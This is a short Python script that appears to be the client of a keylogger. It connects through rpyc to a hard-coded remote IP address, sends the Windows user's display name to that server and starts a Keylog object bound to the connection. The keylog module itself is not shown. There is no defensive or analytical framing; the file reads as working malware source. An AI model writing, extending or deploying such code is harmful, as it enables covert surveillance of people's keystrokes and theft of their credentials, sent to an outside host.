import rpyc
import platform
from includes.keylog import *
from includes.wininfo import *

def main():
    
    conn = connect("67.23.25.86")
    windows = WinInfo()
    username = "\nUserName: %s\n" % (windows.get_display_name())
    
    logger = Keylog(conn)

    conn.modules.sys.stdout.write(username)


def connect(server):
    return rpyc.classic.connect(server)
    

if __name__ == "__main__":
    main()
